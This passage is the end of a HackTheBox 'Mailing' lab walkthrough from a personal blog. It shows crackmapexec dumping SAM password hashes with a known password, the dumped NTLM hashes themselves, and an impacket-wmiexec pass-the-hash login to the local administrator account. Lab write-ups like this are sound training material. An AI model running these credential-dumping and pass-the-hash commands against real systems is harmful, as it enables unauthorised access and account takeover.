+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">crackmapexec</span> <span class="nt">smb</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">11</span><span class="p">.</span><span class="nc">14</span> <span class="nt">-u</span> <span class="nt">maya</span> <span class="nt">-p</span> <span class="s2">&#34;m4y4ngs4ri&#34;</span> <span class="nt">--sam</span>
+</span></span></code></pre></div><p>This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.11.14 -u maya -p &#34;m4y4ngs4ri&#34; --sam
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing FTP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing SMB protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing RDP protocol database
+[*] Initializing MSSQL protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
+SMB         10.10.11.14     445    MAILING          [+] Dumping SAM hashes
+SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
+SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
+SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
+SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
+</code></pre><p>Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.</p>
+<p>I&rsquo;ll use the following command with impacket-wmiexec:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">impacket-wmiexec</span> <span class="nt">localadmin</span><span class="p">@</span><span class="k">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">11</span><span class="p">.</span><span class="nc">14</span> <span class="nt">-hashes</span> <span class="s2">&#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae&#34;</span>
+</span></span></code></pre></div><p>This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.</p>
+<p><img loading="lazy" src="Untitled%202.png" alt="Untitled"  />
+</p>
+<p>There we go! We now have access to the local administrator account. We&rsquo;ve successfully rooted this easy Windows box. Great job!</p>
+<h3 id="conclusion">Conclusion:<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h3>
+<p>Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! 🫡</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="http://localhost:1313/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/ctf/csaw-quals-2024/">
+    <span class="title">Next »</span>
+    <br>
+    <span>CSAW Quals 2024</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on x"
+            href="https://x.com/intent/tweet/?text=Mailing%20Writeup&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f&amp;hashtags=HackTheBox%2cWindows%2cEasy">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f&amp;title=Mailing%20Writeup&amp;summary=Mailing%20Writeup&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on reddit"
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f&title=Mailing%20Writeup">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on whatsapp"
+            href="https://api.whatsapp.com/send?text=Mailing%20Writeup%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on telegram"
+            href="https://telegram.me/share/url?text=Mailing%20Writeup&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Mailing Writeup on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=Mailing%20Writeup&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhackthebox%2fmailing%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/">Rezy Dev</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
